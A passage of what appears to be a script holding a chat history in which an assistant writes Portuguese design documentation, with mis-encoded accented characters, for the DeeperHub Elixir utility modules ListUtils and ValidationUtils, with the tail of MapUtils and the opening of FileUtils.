N√£o aplic√°vel para um m√≥dulo de utilit√°rios puros. A instrumenta√ß√£o ocorreria nos m√≥dulos que utilizam essas fun√ß√µes, se uma chamada espec√≠fica a uma fun√ß√£o de `MapUtils` se mostrar um gargalo.

## ‚ùå 11. Tratamento de Erros

*   Fun√ß√µes devem ser claras sobre como lidam com entradas inv√°lidas (ex: passar uma lista para uma fun√ß√£o que espera um mapa). Geralmente, devem levantar `ArgumentError` ou `FunctionClauseError`.
*   `string_keys_to_atoms` deve ser usado com cautela, pois a cria√ß√£o desenfreada de √°tomos pode levar ao esgotamento da tabela de √°tomos. Idealmente, usar apenas para um conjunto conhecido de chaves string.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   Geralmente baixo risco de seguran√ßa direto, pois s√£o fun√ß√µes de manipula√ß√£o de dados.
*   A seguran√ßa se torna relevante no contexto de como os mapas resultantes s√£o usados (ex: se um mapa com chaves de √°tomo convertidas de strings de usu√°rio for usado em `apply/3` de forma insegura, mas isso √© um problema do chamador, n√£o do `MapUtils`).

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Adicione novas fun√ß√µes apenas se forem utilidades de mapa gen√©ricas e amplamente aplic√°veis.
*   Mantenha a pureza funcional e a imutabilidade.
*   Documente claramente o comportamento, especialmente para casos de borda e tratamento de `nil`.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Adicionar `deep_atomize_keys/1` e `deep_stringify_keys/1` como atalhos para as vers√µes recursivas.
*   [ ] Considerar fun√ß√µes para transforma√ß√µes mais complexas, como `rename_keys/2` ou `transform_keys_and_values/2`.
*   [ ] Otimizar fun√ß√µes para performance em mapas muito grandes, se necess√°rio, embora as implementa√ß√µes baseadas em `Enum` e `Map` do Elixir j√° sejam bastante eficientes.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Utilit√°rios de mapa s√£o sempre bem-vindos para manter o c√≥digo limpo!

Pr√≥ximo? Podemos fazer `DeeperHub.Shared.Utils.ListUtils` ou `ValidationUtils` para continuar com os utilit√°rios, ou saltar para um m√≥dulo de dom√≠nio ou outro Core?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""√ìtimo! Vamos continuar com os utilit√°rios e detalhar o `DeeperHub.Shared.Utils.ListUtils`. Manipular listas √© uma tarefa onipresente em Elixir.

---

# M√≥dulo: `DeeperHub.Shared.Utils.ListUtils` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Shared.Utils.ListUtils`

O m√≥dulo `DeeperHub.Shared.Utils.ListUtils` agrupa um conjunto de **fun√ß√µes utilit√°rias para manipula√ß√£o e processamento de listas**. Sendo o Elixir uma linguagem funcional que faz uso extensivo de listas, este m√≥dulo visa fornecer helpers para opera√ß√µes comuns que podem n√£o estar diretamente dispon√≠veis no m√≥dulo `Enum` ou `List` padr√£o, ou para encapsular combina√ß√µes comuns dessas fun√ß√µes de forma mais expressiva.

Estas fun√ß√µes s√£o projetadas para serem gen√©ricas, puras e eficientes, auxiliando em tarefas como divis√£o de listas, compara√ß√£o, agrupamento, ordena√ß√£o complexa e garantia de unicidade. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Divis√£o de Listas:**
    *   Dividir uma lista em sub-listas (chunks) de um tamanho espec√≠fico (`chunk/2`).
    *   Particionar uma lista em duas com base em uma fun√ß√£o predicado (`partition/2`).
*   **Compara√ß√£o de Listas:**
    *   Calcular a diferen√ßa entre duas listas, opcionalmente usando uma fun√ß√£o de chave para compara√ß√£o de elementos (`diff/3`).
*   **Agrupamento de Elementos:**
    *   Agrupar elementos de uma lista com base no resultado de uma fun√ß√£o de chave (`group_by/2`).
*   **Combina√ß√£o de Listas:**
    *   Intercalar os elementos de duas listas (`interleave/2`).
*   **Pagina√ß√£o em Mem√≥ria:**
    *   Simular pagina√ß√£o em uma lista, retornando uma fatia espec√≠fica e metadados de pagina√ß√£o (`paginate/3`).
*   **Ordena√ß√£o Avan√ßada:**
    *   Ordenar uma lista de mapas ou structs com base em m√∫ltiplas chaves de ordena√ß√£o, cada uma com sua pr√≥pria dire√ß√£o (ascendente/descendente) (`sort_by_keys/2`).
*   **Garantia de Unicidade:**
    *   Remover elementos duplicados de uma lista, opcionalmente usando uma fun√ß√£o de chave para determinar a unicidade (`unique/2`).
*   **Outras Opera√ß√µes Comuns:**
    *   (Potencialmente) Flattening de listas aninhadas, amostragem, rota√ß√£o, etc.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

*   **`DeeperHub.Shared.Utils.ListUtils` (M√≥dulo Funcional):**
    *   Cont√©m todas as fun√ß√µes de utilidade para listas.
    *   Utiliza extensivamente os m√≥dulos `Enum` e `List` do Elixir como base para suas implementa√ß√µes.

### 3.2. Estrutura de Diret√≥rios

```
lib/deeper_hub/shared/utils/list_utils.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Imutabilidade:** Todas as fun√ß√µes operam sobre listas e retornam novas listas, sem modificar as listas de entrada.
*   **Lazy Evaluation vs. Eager Evaluation:** Para opera√ß√µes em listas potencialmente muito grandes, considerar se uma implementa√ß√£o lazy (usando `Stream`) seria mais apropriada para algumas fun√ß√µes, embora a maioria dos utilit√°rios tende a ser eager.
*   **Consist√™ncia com API `Enum` e `List`:** Onde poss√≠vel, manter a sem√¢ntica e os nomes de argumentos consistentes com as fun√ß√µes padr√£o do Elixir.
*   **Performance:** Para opera√ß√µes que podem ser custosas (ex: ordena√ß√£o complexa, diff em listas grandes), considerar a efici√™ncia algor√≠tmica.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Exibir Itens em Lotes:**
    *   `ListUtils.chunk(all_items, 10)` para processar ou exibir itens em p√°ginas de 10.
*   **Encontrar Novos Usu√°rios em uma Lista:**
    *   `ListUtils.diff(current_users, previous_users, &(&1.id))` para identificar usu√°rios rec√©m-adicionados.
*   **Organizar Tarefas por Prioridade:**
    *   `ListUtils.group_by(tasks, &(&1.priority))` para obter um mapa de prioridade para listas de tarefas.
*   **Renderizar uma Tabela Paginada:**
    *   `ListUtils.paginate(all_table_rows, current_page, 20)`.
*   **Ordenar uma Lista de Produtos por Pre√ßo e Depois por Nome:**
    *   `ListUtils.sort_by_keys(products, [{:price, :asc}, {:name, :asc}])`.
*   **Obter uma Lista de Tags √önicas de M√∫ltiplas Fontes:**
    *   `ListUtils.unique(list_of_all_tags_from_servers, &(&1.name |> String.downcase()))`.

## üåä 5. Fluxos Importantes

N√£o aplic√°vel no mesmo sentido que m√≥dulos com estado. O fluxo √© a execu√ß√£o da fun√ß√£o com a lista de entrada e o retorno da lista transformada ou do resultado calculado.

## üì° 6. API (Fun√ß√µes P√∫blicas do M√≥dulo)

*(Baseado na documenta√ß√£o original, com algumas clarifica√ß√µes)*

### 6.1. `DeeperHub.Shared.Utils.ListUtils.chunk(list :: list(), chunk_size :: pos_integer()) :: list(list())`

*   **Descri√ß√£o:** Divide `list` em sub-listas, cada uma com no m√°ximo `chunk_size` elementos.
*   **Exemplo:** `ListUtils.chunk([1,2,3,4,5], 2)` -> `[[1,2], [3,4], [5]]`

### 6.2. `DeeperHub.Shared.Utils.ListUtils.partition(list :: list(), predicate_fun :: (element :: term() -> boolean())) :: {list(), list()}`

*   **Descri√ß√£o:** Divide `list` em duas listas: a primeira com elementos para os quais `predicate_fun` retorna `true`, e a segunda com os restantes.
*   **Exemplo:** `ListUtils.partition([1,2,3,4], &Integer.is_even/1)` -> `{[2,4], [1,3]}`

### 6.3. `DeeperHub.Shared.Utils.ListUtils.diff(list1 :: list(), list2 :: list(), key_fun :: (element :: term() -> term()) | nil \\\\ nil) :: list()`

*   **Descri√ß√£o:** Retorna os elementos que est√£o em `list1` mas n√£o em `list2`. Se `key_fun` for fornecida, a compara√ß√£o √© baseada no resultado da aplica√ß√£o de `key_fun` a cada elemento.
*   **Exemplo:** `ListUtils.diff([%{id: 1}, %{id: 2}], [%{id: 2}, %{id: 3}], &(&1.id))` -> `[%{id: 1}]`

### 6.4. `DeeperHub.Shared.Utils.ListUtils.group_by(list :: list(), key_fun :: (element :: term() -> group_key :: term())) :: map()`

*   **Descri√ß√£o:** Agrupa elementos de `list` em um mapa, onde as chaves s√£o o resultado de `key_fun` e os valores s√£o listas dos elementos correspondentes.
*   **Exemplo:** `ListUtils.group_by([%{type: \"A\"}, %{type: \"B\"}, %{type: \"A\"}], &(&1.type))` -> `%{ \"A\" => [%{type: \"A\"}, %{type: \"A\"}], \"B\" => [%{type: \"B\"}]}`

### 6.5. `DeeperHub.Shared.Utils.ListUtils.interleave(list1 :: list(), list2 :: list()) :: list()`

*   **Descri√ß√£o:** Cria uma nova lista intercalando os elementos de `list1` e `list2`. Se uma lista for mais longa, seus elementos restantes s√£o anexados no final.
*   **Exemplo:** `ListUtils.interleave([1,3], [2,4,5])` -> `[1,2,3,4,5]`

### 6.6. `DeeperHub.Shared.Utils.ListUtils.paginate(list :: list(), page_number :: pos_integer(), per_page :: pos_integer()) :: %{items: list(), page: pos_integer(), per_page: pos_integer(), total_items: non_neg_integer(), total_pages: non_neg_integer()}`

*   **Descri√ß√£o:** Retorna uma \"p√°gina\" de itens da `list` e metadados de pagina√ß√£o.
*   **Exemplo:** `ListUtils.paginate(Enum.to_list(1..10), 2, 3)` -> `%{items: [4,5,6], page: 2, per_page: 3, total_items: 10, total_pages: 4}`

### 6.7. `DeeperHub.Shared.Utils.ListUtils.sort_by_keys(list_of_maps_or_structs :: list(), sort_definitions :: list({key_path :: atom() | list(), direction :: :asc | :desc})) :: list()`

*   **Descri√ß√£o:** Ordena uma lista de mapas/structs. `sort_definitions` √© uma lista de tuplas onde `key_path` pode ser um √°tomo para acesso direto ou uma lista para acesso aninhado (ex: `[:user, :name]`).
*   **Exemplo:** `ListUtils.sort_by_keys([%{a:2,b:1}, %{a:1,b:2}], [{:a, :asc}])` -> `[%{a:1,b:2}, %{a:2,b:1}]`

### 6.8. `DeeperHub.Shared.Utils.ListUtils.unique(list :: list(), key_fun :: (element :: term() -> unique_key :: term()) | nil \\\\ nil) :: list()`

*   **Descri√ß√£o:** Remove elementos duplicados da `list`. Se `key_fun` for fornecida, a unicidade √© baseada no resultado de `key_fun`. A ordem dos elementos restantes √© preservada com base na primeira ocorr√™ncia.
*   **Exemplo:** `ListUtils.unique([%{id:1, v:1}, %{id:2,v:2}, %{id:1,v:3}], &(&1.id))` -> `[%{id:1, v:1}, %{id:2,v:2}]`

### 6.9. `DeeperHub.Shared.Utils.ListUtils.safe_nth(list :: list(), index :: integer(), default_value :: term() \\\\ nil) :: term()` (Nova Sugest√£o)

*   **Descri√ß√£o:** Retorna o elemento no `index` (base 0) da lista, ou `default_value` se o √≠ndice estiver fora dos limites.
*   **Exemplo:** `ListUtils.safe_nth([10,20,30], 1)` -> `20`, `ListUtils.safe_nth([10], 5, :not_found)` -> `:not_found`

### 6.10. `DeeperHub.Shared.Utils.ListUtils.transpose(list_of_lists :: list(list())) :: list(list()) | {:error, :uneven_lists}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Transp√µe as linhas e colunas de uma lista de listas. Retorna erro se as listas internas tiverem tamanhos diferentes.
*   **Exemplo:** `ListUtils.transpose([[1,2,3],[4,5,6]])` -> `[[1,4],[2,5],[3,6]]`

## ‚öôÔ∏è 7. Configura√ß√£o

Este m√≥dulo, sendo puramente funcional e gen√©rico, geralmente n√£o requer configura√ß√µes externas via `ConfigManager`.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   Nenhuma.

### 8.2. Bibliotecas Externas

*   Utiliza primariamente os m√≥dulos `Enum` e `List` do Elixir padr√£o.

## ü§ù 9. Como Usar / Integra√ß√£o

Importar ou usar alias e chamar as fun√ß√µes diretamente onde a manipula√ß√£o de listas for necess√°ria.
```elixir
alias DeeperHub.Shared.Utils.ListUtils

def process_batched_users(all_users) do
  Enum.each(ListUtils.chunk(all_users, 100), fn user_batch ->
    # Processar o lote de usu√°rios
  end)
end

def find_unique_emails(user_list) do
  ListUtils.unique(user_list, &(&1.email))
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unit√°rios para cada fun√ß√£o com uma variedade de entradas:
    *   Listas vazias.
    *   Listas com um √∫nico elemento.
    *   Listas com elementos duplicados (para `unique`, `diff`).
    *   Listas com diferentes tipos de dados.
    *   Casos de borda para `chunk`, `paginate`.
    *   Diferentes `key_fun` para `diff`, `group_by`, `unique`, `sort_by_keys`.
*   Localiza√ß√£o: `test/deeper_hub/shared/utils/list_utils_test.exs`.

### 10.2. M√©tricas / 10.3. Logs / 10.4. Telemetria

N√£o aplic√°vel para um m√≥dulo de utilit√°rios puros.

## ‚ùå 11. Tratamento de Erros

*   Fun√ß√µes devem levantar `ArgumentError` ou `FunctionClauseError` para tipos de entrada inv√°lidos (ex: passar um mapa para uma fun√ß√£o que espera uma lista, `chunk_size` n√£o positivo).
*   Fun√ß√µes como `paginate` devem lidar graciosamente com n√∫meros de p√°gina ou `per_page` inv√°lidos (ex: retornar uma lista vazia ou a primeira p√°gina).
*   A documenta√ß√£o de cada fun√ß√£o deve ser clara sobre seu comportamento em caso de erro.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   Geralmente baixo risco de seguran√ßa direto, pois s√£o fun√ß√µes de manipula√ß√£o de dados.
*   Se as listas contiverem dados sens√≠veis, as fun√ß√µes n√£o os modificar√£o ou expor√£o, apenas os reorganizar√£o ou filtrar√£o. A seguran√ßa dos dados em si √© responsabilidade do chamador.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Adicione novas fun√ß√µes apenas se forem utilidades de lista gen√©ricas e amplamente aplic√°veis.
*   Priorize a clareza e a consist√™ncia com as APIs `Enum` e `List` existentes.
*   Considere a performance de fun√ß√µes que operam em listas potencialmente grandes.
*   Adicione testes unit√°rios completos.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Adicionar mais fun√ß√µes utilit√°rias (ex: `rotate_list/2`, `weighted_sample/2`, `power_set/1`).
*   [ ] Para algumas fun√ß√µes que podem operar em listas muito grandes (ex: `group_by`, `unique` complexo), considerar oferecer uma variante baseada em `Stream` para processamento lazy.
*   [ ] Melhorar `sort_by_keys` para lidar com `nil` valores de forma configur√°vel (ex: nils primeiro, nils por √∫ltimo).

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Com isso, cobrimos os utilit√°rios de lista.

Para o pr√≥ximo, podemos fazer `DeeperHub.Shared.Utils.ValidationUtils` ou `DeeperHub.Shared.Utils.SecurityUtils` para continuar nos utilit√°rios, ou mudar para um m√≥dulo de dom√≠nio ou Core mais espec√≠fico?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos continuar com os utilit√°rios e detalhar o `DeeperHub.Shared.Utils.ValidationUtils`. Este m√≥dulo √© essencial para garantir a integridade dos dados que entram no sistema.

---

# M√≥dulo: `DeeperHub.Shared.Utils.ValidationUtils` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Shared.Utils.ValidationUtils`

O m√≥dulo `DeeperHub.Shared.Utils.ValidationUtils` fornece um conjunto de **fun√ß√µes utilit√°rias para valida√ß√£o de formatos de dados comuns e verifica√ß√£o de requisitos b√°sicos**. Ele √© usado em v√°rias partes do sistema DeeperHub para garantir que os dados de entrada, antes de serem processados ou persistidos, atendam a certos crit√©rios de formato e presen√ßa.

Este m√≥dulo foca em valida√ß√µes gen√©ricas e reutiliz√°veis. Valida√ß√µes mais complexas ou espec√≠ficas de regras de neg√≥cio devem residir nos schemas Ecto dos m√≥dulos de dom√≠nio ou em servi√ßos de valida√ß√£o dedicados (como `DeeperHub.API.Validation.APIRequestValidator` ou `DeeperHub.Security.Validation.SecurityInputValidation` para contextos espec√≠ficos). üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Valida√ß√£o de Formatos Comuns:**
    *   Verificar se uma string √© um endere√ßo de email v√°lido (formato b√°sico) (`validate_email/1`).
    *   Verificar se uma string √© um n√∫mero de telefone v√°lido (formato b√°sico) (`validate_phone/1`).
    *   Verificar se uma string √© uma URL v√°lida (`validate_url/2`).
    *   Verificar se uma string representa uma data/hora v√°lida em um formato espec√≠fico (`validate_date/3`).
    *   Verificar se uma string representa um n√∫mero de documento v√°lido (CPF, CNPJ) para um tipo e pa√≠s (b√°sico) (`validate_document/3`).
    *   Verificar se uma string √© um JSON v√°lido (`validate_json/3`).
*   **Valida√ß√£o de Requisitos de Dados:**
    *   Verificar se um valor est√° presente (n√£o `nil`, n√£o string vazia/em branco) (`validate_required/1`).
    *   Validar a complexidade b√°sica de uma senha (comprimento, presen√ßa de tipos de caracteres) (`validate_password/2`). (Nota: Valida√ß√£o de pol√≠tica de senha mais robusta estaria em `DeeperHub.Auth` ou `SecurityPolicyManager`).
    *   Validar o formato e comprimento de um nome de usu√°rio (`validate_username/2`).
*   **Valida√ß√£o de Estrutura de Mapas:**
    *   Verificar se um mapa cont√©m um conjunto espec√≠fico de chaves obrigat√≥rias (`validate_map/2`).

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

*   **`DeeperHub.Shared.Utils.ValidationUtils` (M√≥dulo Funcional):**
    *   Cont√©m todas as fun√ß√µes de utilidade para valida√ß√£o.
    *   Utiliza regex e fun√ß√µes de string/tipo do Elixir para as verifica√ß√µes.
    *   Pode, para valida√ß√µes mais complexas (como documentos espec√≠ficos de pa√≠s), delegar para bibliotecas especializadas se necess√°rio, mas o objetivo aqui √© manter utilit√°rios leves.

### 3.2. Estrutura de Diret√≥rios

```
lib/deeper_hub/shared/utils/validation_utils.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Retorno Consistente:** As fun√ß√µes de valida√ß√£o devem ter um padr√£o de retorno consistente, por exemplo:
    *   Retornar `true`/`false` para verifica√ß√µes simples.
    *   Retornar `{:ok, validated_value}` ou `{:error, reason_atom | {reason_atom, details_map}}` para valida√ß√µes que podem retornar o valor validado ou detalhes do erro. A documenta√ß√£o original usava ambos os estilos. Padronizar em `{:ok, ...} | {:error, ...}` pode ser mais robusto.
*   **Regex Simples vs. Bibliotecas:** Para valida√ß√µes como email e URL, usar regex simples e bem testadas para formatos comuns. Para valida√ß√µes muito complexas ou que exigem conformidade estrita com RFCs, o uso de bibliotecas dedicadas pode ser considerado, mas adiciona depend√™ncias.
*   **N√£o Substitui Valida√ß√£o de Schema Ecto:** Este m√≥dulo complementa, mas n√£o substitui, as valida√ß√µes realizadas por Ecto Changesets nos m√≥dulos de dom√≠nio. Ele √© √∫til para valida√ß√µes r√°pidas em camadas de servi√ßo ou antes de criar changesets.
*   **Configurabilidade Limitada:** Algumas fun√ß√µes podem aceitar op√ß√µes (ex: `min_length` para senha), mas configura√ß√µes globais para esses utilit√°rios s√£o menos comuns e geralmente pertencem a m√≥dulos de pol√≠tica.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Valida√ß√£o de Formul√°rio na API antes de criar Changeset:**
    *   Um controller recebe `params = %{\"email\" => \"test\", \"password\" => \"123\"}`.
    *   Antes de passar para `Accounts.create_user(params)`:
        ```elixir
        if !ValidationUtils.validate_email(params[\"email\"]), do: errors = [email: \"Formato inv√°lido\" | errors]
        if !ValidationUtils.validate_password(params[\"password\"], min_length: 8), do: errors = [password: \"Muito curta\" | errors]
        ```
*   **Verificar se um campo obrigat√≥rio foi enviado:**
    *   `if !ValidationUtils.validate_required(params[\"user_agent\"]), do: # tratar erro`
*   **Sanitizar e depois validar uma URL de um perfil externo:**
    *   `clean_url = SomeSanitizer.sanitize_url(user_input_url)`
    *   `case ValidationUtils.validate_url(clean_url, allowed_protocols: [\"http\", \"https\"]) do ... end`

## üåä 5. Fluxos Importantes

N√£o aplic√°vel no mesmo sentido que m√≥dulos com estado. O fluxo √© a execu√ß√£o da fun√ß√£o com os dados de entrada e o retorno do resultado da valida√ß√£o.

## üì° 6. API (Fun√ß√µes P√∫blicas do M√≥dulo)

*(Baseado na documenta√ß√£o original, com sugest√£o de padronizar retornos para `{:ok, ...} | {:error, ...}` onde apropriado para maior clareza do que apenas booleanos)*

### 6.1. `DeeperHub.Shared.Utils.ValidationUtils.validate_email(email :: String.t() | nil) :: {:ok, String.t()} | {:error, :invalid_format | :missing}`

*   **Descri√ß√£o:** Valida o formato b√°sico de um endere√ßo de email.
*   **Retorno:** `{:ok, email}` se v√°lido, `{:error, :missing}` se `nil` ou vazio, `{:error, :invalid_format}` para outros erros.

### 6.2. `DeeperHub.Shared.Utils.ValidationUtils.validate_phone(phone :: String.t() | nil, opts :: keyword()) :: {:ok, String.t()} | {:error, :invalid_format | :missing}`

*   **Descri√ß√£o:** Valida o formato b√°sico de um n√∫mero de telefone.
*   **`opts`:** `:country_code` (atom, ex: `:BR`, `:US` para aplicar regras espec√≠ficas de comprimento/formato, se implementado), `:min_digits` (integer).
*   **Retorno:** `{:ok, phone}` se v√°lido, `{:error, :missing}` se `nil` ou vazio, `{:error, :invalid_format}` ou `{:error, :too_short}`.

### 6.3. `DeeperHub.Shared.Utils.ValidationUtils.validate_url(url :: String.t() | nil, opts :: keyword()) :: {:ok, String.t()} | {:error, :invalid_format | :missing | :disallowed_protocol}`

*   **Descri√ß√£o:** Valida o formato de uma URL.
*   **`opts`:**
    *   `:require_protocol` (boolean, Padr√£o: `true`).
    *   `:allowed_protocols` (list(String.t), Padr√£o: `[\"http\", \"https\"]`).

### 6.4. `DeeperHub.Shared.Utils.ValidationUtils.validate_date(date_string :: String.t() | nil, format_string :: String.t() \\\\ \"YYYY-MM-DD\", opts :: keyword()) :: {:ok, Date.t() | NaiveDateTime.t()} | {:error, :invalid_format | :missing | :invalid_date}`

*   **Descri√ß√£o:** Valida se `date_string` corresponde ao `format_string` e representa uma data/hora v√°lida. Tenta converter para `NaiveDateTime` ou `Date`.
*   **`opts`:** `:return_type` (`:naive_datetime`, `:date`, `:datetime_utc` - este √∫ltimo exigiria timezone info ou assumiria UTC).

### 6.5. `DeeperHub.Shared.Utils.ValidationUtils.validate_document(doc_string :: String.t() | nil, type :: atom(), opts :: keyword()) :: {:ok, String.t()} | {:error, :invalid_format | :missing | :invalid_checksum}`

*   **Descri√ß√£o:** Valida√ß√£o b√°sica para n√∫meros de documento (ex: CPF, CNPJ). A l√≥gica de checksum seria simplificada ou delegada se complexa.
*   **`type`:** Ex: `:cpf_br`, `:cnpj_br`.
*   **`opts`:** `:validate_checksum` (boolean, Padr√£o: `true`).

### 6.6. `DeeperHub.Shared.Utils.ValidationUtils.validate_password(password :: String.t() | nil, opts :: keyword()) :: {:ok, String.t()} | {:error, atom()}`

*   **Descri√ß√£o:** Valida a complexidade b√°sica de uma senha.
*   **`opts`:** `:min_length` (Padr√£o: 8), `:require_uppercase` (Padr√£o: `true`), `:require_lowercase` (Padr√£o: `true`), `:require_digit` (Padr√£o: `true`), `:require_special` (Padr√£o: `false`).
*   **Retorno de Erro:** Ex: `:missing`, `:too_short`, `:missing_uppercase`, `:missing_lowercase`, `:missing_digit`, `:missing_special`.

### 6.7. `DeeperHub.Shared.Utils.ValidationUtils.validate_username(username :: String.t() | nil, opts :: keyword()) :: {:ok, String.t()} | {:error, atom()}`

*   **Descri√ß√£o:** Valida o formato e comprimento de um nome de usu√°rio.
*   **`opts`:** `:min_length` (Padr√£o: 3), `:max_length` (Padr√£o: 30), `:allowed_chars_regex` (Padr√£o: `~r/^[a-zA-Z0-9_]+$/u`).
*   **Retorno de Erro:** Ex: `:missing`, `:too_short`, `:too_long`, `:invalid_chars`.

### 6.8. `DeeperHub.Shared.Utils.ValidationUtils.validate_required(value :: term()) :: boolean()`

*   **Descri√ß√£o:** Verifica se um valor √© considerado \"presente\" (n√£o `nil`, n√£o string vazia, n√£o string s√≥ com espa√ßos).
*   **Retorno:** `true` ou `false`.

### 6.9. `DeeperHub.Shared.Utils.ValidationUtils.validate_map_keys(map_data :: map(), required_keys :: list(atom() | String.t()), opts :: keyword()) :: {:ok, map()} | {:error, {:missing_keys, list()} | :not_a_map}` (Renomeado de `validate_map`)

*   **Descri√ß√£o:** Verifica se `map_data` √© um mapa e cont√©m todas as `required_keys`.
*   **`opts`:** `:allow_nil_values_for_required_keys` (boolean, Padr√£o: `false` - ou seja, a chave deve existir E ter um valor n√£o-nil se esta op√ß√£o for false).

## ‚öôÔ∏è 7. Configura√ß√£o

Geralmente, os padr√µes para valida√ß√µes (ex: comprimento m√≠nimo de senha, regex de username) podem ser configurados via `Core.ConfigManager` para permitir ajustes sem alterar o c√≥digo.

*   `[:shared, :utils, :validation, :password, :min_length]`
*   `[:shared, :utils, :validation, :username, :allowed_chars_regex]`
*   ... etc.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager` (para obter padr√µes configur√°veis).

### 8.2. Bibliotecas Externas

*   Pode usar bibliotecas para valida√ß√µes mais complexas se forem adicionadas (ex: `ExCpfCnpj` para documentos brasileiros, `NimbleParsec` para formatos customizados). Para o b√°sico, fun√ß√µes de `String`, `Regex` e `Integer` do Elixir s√£o suficientes.

## ü§ù 9. Como Usar / Integra√ß√£o

Em controllers ou servi√ßos, antes de processar dados de entrada ou criar changesets Ecto.

```elixir
defmodule MyApp.RegistrationController do
  alias DeeperHub.Shared.Utils.ValidationUtils

  def create(conn, %{\"user\" => user_params}) do
    with {:ok, email} <- ValidationUtils.validate_email(user_params[\"email\"]),
         {:ok, pass}  <- ValidationUtils.validate_password(user_params[\"password\"], min_length: 10),
         {:ok, uname} <- ValidationUtils.validate_username(user_params[\"username\"]) do
      # Prossiga com a cria√ß√£o do usu√°rio com email, pass, uname
      # ...
    else
      {:error, :missing} -> # Lidar com campo ausente
      {:error, :invalid_format} -> # Lidar com email/username inv√°lido
      {:error, :too_short} -> # Lidar com senha curta
      # ... outros erros ...
    end
  end
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unit√°rios exaustivos para cada fun√ß√£o de valida√ß√£o, cobrindo:
    *   Entradas v√°lidas.
    *   Diferentes tipos de entradas inv√°lidas (formato, comprimento, aus√™ncia, etc.).
    *   Casos de borda.
    *   Comportamento com `nil` e strings vazias.
    *   Efeito das diferentes op√ß√µes (`opts`).
*   Localiza√ß√£o: `test/deeper_hub/shared/utils/validation_utils_test.exs`.

### 10.2. M√©tricas / 10.3. Logs / 10.4. Telemetria

Geralmente n√£o aplic√°vel para um m√≥dulo de utilit√°rios puros. O chamador seria respons√°vel por logar/metricar falhas de valida√ß√£o se relevante para o seu contexto.

## ‚ùå 11. Tratamento de Erros

*   As fun√ß√µes devem retornar tuplas `{:ok, valid_value}` ou `{:error, reason_atom | {reason_atom, details}}` para permitir que o chamador trate os erros de forma program√°tica.
*   Evitar levantar exce√ß√µes para entradas inv√°lidas, a menos que seja um erro de programa√ß√£o (ex: tipo de argumento incorreto para a pr√≥pria fun√ß√£o de valida√ß√£o).

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **N√£o √© uma Defesa Completa:** Estas valida√ß√µes de formato s√£o uma primeira linha de defesa, mas n√£o substituem a sanitiza√ß√£o de entrada (para XSS, SQLi) ou valida√ß√µes de l√≥gica de neg√≥cio mais profundas.
*   **Regexes:** Se usar regexes, garantir que sejam bem testadas e n√£o vulner√°veis a ReDoS (Regular Expression Denial of Service).
*   **Falsos Negativos/Positivos:** Estar ciente das limita√ß√µes das valida√ß√µes baseadas em regex (ex: `validate_email` pode permitir alguns emails tecnicamente inv√°lidos ou rejeitar alguns v√°lidos, mas obscuros).

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao adicionar novas fun√ß√µes de valida√ß√£o, garanta que sejam gen√©ricas e que o comportamento de erro seja consistente com as existentes.
*   Adicione testes unit√°rios completos.
*   Documente claramente os formatos esperados e as op√ß√µes.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Adicionar mais validadores para tipos comuns (ex: UUID, ISBN, IBAN).
*   [ ] Para valida√ß√µes mais complexas (ex: CPF/CNPJ com l√≥gica de checksum completa), considerar a integra√ß√£o de bibliotecas dedicadas ou a cria√ß√£o de validadores mais robustos.
*   [ ] Permitir que as mensagens de erro retornadas por `{:error, reason}` sejam c√≥digos de i18n para tradu√ß√£o na camada de apresenta√ß√£o.
*   [ ] Criar um validador `validate_number_range(number, min, max, opts)`.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Com isso, cobrimos um bom conjunto de utilit√°rios.

Pr√≥ximo? Podemos detalhar `DeeperHub.Shared.Utils.FileUtils` e `SecurityUtils` para completar os Utils, ou prefere agora ir para um m√≥dulo de dom√≠nio como `DeeperHub.OAuth` ou `DeeperHub.MFA`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos continuar com os utilit√°rios e detalhar o `DeeperHub.Shared.Utils.FileUtils`. Este m√≥dulo √© √∫til se a sua aplica√ß√£o DeeperHub precisar interagir diretamente com o sistema de arquivos do servidor.

---

# M√≥dulo: `DeeperHub.Shared.Utils.FileUtils` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Shared.Utils.FileUtils`

